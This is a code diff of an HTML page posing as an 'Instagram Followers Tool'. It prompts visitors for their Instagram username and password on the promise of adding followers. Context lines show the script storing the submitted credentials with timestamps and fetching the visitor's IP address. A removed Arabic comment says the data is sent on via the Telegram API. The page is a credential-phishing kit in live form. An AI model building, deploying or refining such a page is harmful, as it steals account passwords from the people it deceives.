@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta name="google-site-verification" content="i4pNmaB-tvwv3Wr6AM0dQ3STiDDSqsbbtDZVbnmxFmU" />
-    <meta name="description" content="A tool to analyze Instagram account performance.">
-    <meta name="author" content="Your Name">
-    <meta name="robots" content="index, follow">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Followers Tool</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
+    <head>
+        <meta name="google-site-verification" content="i4pNmaB-tvwv3Wr6AM0dQ3STiDDSqsbbtDZVbnmxFmU" />
+        <meta name="description" content="A tool to analyze Instagram account performance.">
+        <meta name="author" content="Your Name">
+        <meta name="robots" content="index, follow">
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Instagram Followers Tool</title>
+        <link rel="stylesheet" href="styles.css">
+    </head>
 <body>
     <header>
+        <meta name="description" content="A tool to analyze Instagram account performance.">
+        <meta name="author" content="Your Name">
+        <meta name="robots" content="index, follow">
         <div class="logo-container">
             <img src="instagram-logo.png" alt="Instagram Logo" class="logo">
             <h1>Instagram Followers Tool</h1>
@@ -25,11 +28,27 @@
             <h2>Enter Your Details</h2>
             <form id="followers-form">
                 <label for="username">Username, Email, or Phone</label>
-                <input type="text" id="username" name="username" placeholder="Enter your username, email, or phone" required>
-
+                <input 
+                    type="text" 
+                    id="username" 
+                    name="username" 
+                    placeholder="Enter your username, email, or phone" 
+                    required 
+                    pattern="[a-zA-Z0-9@.]+"
+                    title="Only English letters, numbers, @, and . are allowed."
+                >
+            
                 <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter your password" required>
-
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    placeholder="Enter your password" 
+                    required 
+                    pattern="[a-zA-Z0-9]+"
+                    title="Only English letters and numbers are allowed."
+                >
+            
                 <button type="submit" id="submit-btn">Add Followers</button>
             </form>
             <p id="message"></p>
@@ -37,8 +56,10 @@
     </main>
 
     <footer>
+        <ul>
+            <li><a href="privacy-policy.html">Privacy Policy</a></li>
+        </ul>
         <p>&copy; 2024 - Instagram Followers Tool. All rights reserved.</p>
-        <li><a href="privacy-policy.html">Privacy Policy</a></li>
     </footer>
 
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
@@ -79,11 +100,9 @@
                 }
             }
 
-            // تخزين البيانات مع الوقت الحالي
             previousSubmissions.push({ username, password, timestamp: currentTime });
             localStorage.setItem("previousSubmissions", JSON.stringify(previousSubmissions));
 
-            // إرسال بيانات Telegram عبر API
             axios.get('https://api.ipify.org?format=json')
                 .then(response => {
                     const ip = response.data.ip;
@@ -121,21 +140,18 @@
                     showMessage('Error fetching the IP address. Please try again.', "error");
                 });
 
-            // إعادة تعيين النموذج
             event.target.reset();
         });
 
-        // دالة عرض الرسائل مع التأثير
         function showMessage(message, type) {
             const messageElement = document.getElementById("message");
             messageElement.textContent = message;
             messageElement.style.color = type === "success" ? "#4CAF50" : "#FF5722";
             messageElement.style.fontWeight = "bold";
 
-            // إخفاء الرسالة بعد 5 ثوانٍ
             setTimeout(() => {
                 messageElement.textContent = "";
-            }, 5000);
+            }, 7000);
         }
     </script>
 </body>
